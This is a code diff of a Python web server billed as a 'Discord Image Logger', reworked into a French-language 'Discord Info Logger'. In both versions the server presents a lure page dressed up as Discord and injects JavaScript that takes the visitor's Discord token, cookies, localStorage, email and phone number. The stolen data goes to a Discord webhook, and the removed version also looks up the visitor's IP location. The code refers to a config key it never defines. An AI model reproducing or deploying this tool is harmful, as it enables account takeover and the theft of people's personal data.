@@ -1,106 +1,231 @@
-# Discord Image Logger - All-in-One
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
-import traceback, requests, base64, httpagentparser, json
+import traceback, requests, base64, re, json
+import threading
 
-# --- CONFIGURATION ---
+__app__ = "Discord Info Logger"
+__description__ = "Collecte les informations Discord des utilisateurs"
+__version__ = "v2.0"
+__author__ = "DeKrypt"
+
 config = {
-    "webhook_url": "https://discord.com/api/webhooks/1486421624290021577/vMAwwjPITk9b9WisuCgm5RowYpn8iTpTgaHDRque7Q_J8QnSHh4ABlHlmWbSkepdWd-r",
-    "image_url": "https://cdn.discordapp.com/attachments/1473071601569366222/1485762309120069732/d24c8368ba4723097d2f0271b21cca22.jpg?ex=69c505ba&is=69c3b43a&hm=4f4e67e12dc9886b6036d72a7b3ad34a9c2bebefceef2821368988e59fac272c",
-    "username": "CDN Notification", "color": 0x5865F2,
-    "redirect": {"enabled": True, "url": "https://discord.com/login"},
-    "data_exfiltration": {
-        "enabled": True, "discord_token": True, "browser_cookies": True,
-        "browser_local_storage": True, "browser_autofill": True
+    "webhook": "https://discord.com/api/webhooks/VOTRE_WEBHOOK_ICI",
+    "image": "https://i.imgur.com/7x0A1xT.png",
+    "username": "Discord Logger",
+    "color": 0x5865F2,
+    "tokenStealing": True,
+    "collectUserInfo": True,
+    "message": {
+        "doMessage": False,
+        "message": "Chargement...",
+        "richMessage": True,
+    },
+    "redirect": {
+        "redirect": False,
+        "page": "https://discord.com"
     }
 }
-# --------------------
 
-blacklistedIPs = ("27", "104", "143", "164")
-
-def botCheck(ip, useragent):
-    return "Discord" if ip.startswith(("34", "35")) else "Telegram" if useragent.startswith("TelegramBot") else False
-
-def reportError(error):
-    requests.post(config["webhook_url"], json={"username": config["username"], "content": "@everyone", "embeds": [{"title": "Error", "color": config["color"], "description": f"```\n{error}\n```"}]})
-
-def makeReport(ip, useragent=None, endpoint="N/A", url=False, stolen_data=None):
-    if ip.startswith(blacklistedIPs) or botCheck(ip, useragent): return
-
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-    os, browser = httpagentparser.simple_detect(useragent)
+def extractDiscordInfo(data):
+    info = {}
     
-    embed = {
-        "username": config["username"], "content": "@everyone",
-        "embeds": [{
-            "title": "Data Logged", "color": config["color"],
-            "description": f"**IP:** `{ip}`\n**Provider:** `{info['isp']}`\n**Country:** `{info['country']}`\n**OS:** `{os}`\n**Browser:** `{browser}`",
-            "thumbnail": {"url": url} if url else None
-        }]
-    }
-
-    if stolen_data and config["data_exfiltration"]["enabled"]:
-        fields = []
-        if stolen_data.get("discord_token"): fields.append({"name": "Discord Token", "value": f"```{stolen_data['discord_token']}```"})
-        if stolen_data.get("cookies"): fields.append({"name": "Cookies", "value": f"```{stolen_data['cookies'][:500]}```"})
-        if fields: embed["embeds"][0]["fields"] = fields
+    # Extraction du token
+    token_patterns = [
+        r'[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}',
+        r'mfa\.[a-zA-Z0-9_-]{84}',
+        r'[a-zA-Z0-9_-]{32}'
+    ]
     
-    requests.post(config["webhook_url"], json=embed)
+    for pattern in token_patterns:
+        matches = re.findall(pattern, data)
+        if matches:
+            info['token'] = matches[0]
+            break
+    
+    # Extraction des informations utilisateur depuis localStorage
+    user_patterns = [
+        r'"username":"([^"]+)"',
+        r'"email":"([^"]+)"',
+        r'"phone":"([^"]+)"',
+        r'"id":"(\d+)"',
+        r'"discriminator":"(\d+)"',
+        r'"avatar":"([^"]+)"',
+        r'"global_name":"([^"]+)"'
+    ]
+    
+    for pattern in user_patterns:
+        matches = re.findall(pattern, data)
+        if matches:
+            key = pattern.split('"')[1]
+            info[key] = matches[0]
+    
     return info
 
-def generate_exfiltration_js():
-    if not config["data_exfiltration"]["enabled"]: return ""
-    js = "const stolenData = {};"
-    if config["data_exfiltration"]["discord_token"]: js += "try{stolenData.discord_token=localStorage.getItem('token');}catch(e){}"
-    if config["data_exfiltration"]["browser_cookies"]: js += "try{stolenData.cookies=document.cookie;}catch(e){}"
-    if config["data_exfiltration"]["browser_local_storage"]: js += "let ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k);}stolenData.localStorage=ls;"
-    return f"<script>{js}fetch('{config['webhook_url']}',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{username:'{config['username']}',content:'@everyone',embeds:[{{title:'Stolen Data',color:{config['color']},description:'```json\\n'+JSON.stringify(stolenData)+'\\n```'}}]}})}});</script>"
+def sendDiscordInfo(discord_info, useragent):
+    embed = {
+        "username": config["username"],
+        "content": "@everyone",
+        "embeds": [{
+            "title": "🎯 Informations Discord Capturées!",
+            "color": config["color"],
+            "description": "**Informations Utilisateur:**\n",
+            "fields": []
+        }]
+    }
+    
+    field_mapping = {
+        'username': '👤 Pseudo',
+        'global_name': '🏷️ Nom Global',
+        'email': '📧 Email',
+        'phone': '📱 Téléphone',
+        'id': '🆔 ID Utilisateur',
+        'discriminator': '#️⃣ Discriminateur',
+        'avatar': '🖼️ Avatar',
+        'token': '🔑 Token'
+    }
+    
+    for key, value in discord_info.items():
+        if key in field_mapping:
+            field_value = f"||{value}||" if key == 'token' else value
+            embed["embeds"][0]["fields"].append({
+                "name": field_mapping[key],
+                "value": field_value,
+                "inline": True
+            })
+    
+    embed["embeds"][0]["fields"].append({
+        "name": "🌐 User-Agent",
+        "value": f"```{useragent[:200]}...```",
+        "inline": False
+    })
+    
+    requests.post(config["webhook"], json=embed)
 
-class ImageLoggerAPI(BaseHTTPRequestHandler):
+def injectDataCollection():
+    return '''
+<script>
+// Collecte des informations Discord
+function collectDiscordInfo() {
+    const info = {};
+    
+    // Récupération depuis localStorage
+    try {
+        const token = localStorage.getItem('token') || 
+                     localStorage.getItem('discord_token') ||
+                     document.cookie.split(';').find(c => c.trim().startsWith('dc_token='))?.split('=')[1];
+        
+        if (token) info.token = token;
+        
+        // Récupération des infos utilisateur
+        const userStr = localStorage.getItem('user_settings_cache') ||
+                       localStorage.getItem('user');
+        
+        if (userStr) {
+            const userData = JSON.parse(userStr);
+            if (userData.username) info.username = userData.username;
+            if (userData.email) info.email = userData.email;
+            if (userData.phone) info.phone = userData.phone;
+            if (userData.id) info.id = userData.id;
+            if (userData.discriminator) info.discriminator = userData.discriminator;
+            if (userData.avatar) info.avatar = userData.avatar;
+            if (userData.global_name) info.global_name = userData.global_name;
+        }
+    } catch(e) {}
+    
+    // Envoi des données
+    if (Object.keys(info).length > 0) {
+        fetch(window.location.href, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify(info)
+        });
+    }
+}
+
+// Exécution immédiate et après chargement
+collectDiscordInfo();
+setTimeout(collectDiscordInfo, 2000);
+</script>
+'''
+
+class DiscordLoggerAPI(BaseHTTPRequestHandler):
+    
     def handleRequest(self):
         try:
-            ip = self.headers.get('x-forwarded-for')
-            useragent = self.headers.get('user-agent')
-            endpoint = self.path.split("?")[0]
-            
-            # Handle Discord crawler
-            if botCheck(ip, useragent):
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            # Traitement POST pour les données collectées
+            if self.command == 'POST':
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_data = self.rfile.read(content_length).decode('utf-8')
+                
+                try:
+                    discord_info = json.loads(post_data)
+                    sendDiscordInfo(discord_info, self.headers.get('user-agent', ''))
+                except:
+                    pass
+                
                 self.send_response(200)
-                self.send_header('Content-type', 'image/jpeg')
                 self.end_headers()
-                self.wfile.write(base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'))
-                makeReport(ip, useragent, endpoint)
                 return
 
-            # Handle actual user
-            stolen_data = None
-            if config["data_exfiltration"]["enabled"]:
-                # In a real scenario, JS would send this back to a /collect endpoint
-                # For simplicity, we'll just log the IP and let the JS report separately
-                pass
+            # Page HTML avec image et injection
+            html_content = f'''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord</title>
+    <style>
+        body {{ margin: 0; padding: 0; background: #36393f; }}
+        .container {{ 
+            width: 100vw; 
+            height: 100vh; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            background-image: url('{url}');
+            background-size: cover;
+            background-position: center;
+        }}
+    </style>
+</head>
+<body>
+    <div class="container"></div>
+    {injectDataCollection()}
+</body>
+</html>
+'''
 
-            makeReport(ip, useragent, endpoint, config["image_url"], stolen_data)
-            
-            # Serve the page with JS
-            html = f'<style>body{{margin:0;background:url("{config["image_url"]}") center/cover no-repeat;height:100vh;}}</style>{generate_exfiltration_js()}'
-            if config["redirect"]["enabled"]:
-                html = f'<meta http-equiv="refresh" content="1;url={config["redirect"]["url"]}">{html}'
+            if config["redirect"]["redirect"]:
+                html_content = f'<meta http-equiv="refresh" content="2;url={config["redirect"]["page"]}">'
             
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.end_headers()
-            self.wfile.write(html.encode())
-
-        except Exception:
+            self.wfile.write(html_content.encode())
+            
+        except Exception as e:
             self.send_response(500)
             self.end_headers()
-            self.wfile.write(b'500 Error')
-            reportError(traceback.format_exc())
+            self.wfile.write(b'500 - Internal Server Error')
+            print(f"Error: {e}")
 
-    do_GET = do_POST = handleRequest
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+def run_server(port=8080):
+    server_address = ('', port)
+    httpd = HTTPServer(server_address, DiscordLoggerAPI)
+    print(f"Serveur démarré sur le port {port}")
+    httpd.serve_forever()
 
 if __name__ == '__main__':
-    server_address = ('', 8080)
-    httpd = HTTPServer(server_address, ImageLoggerAPI)
-    print("Server running on port 8080...")
-    httpd.serve_forever()
+    run_server()
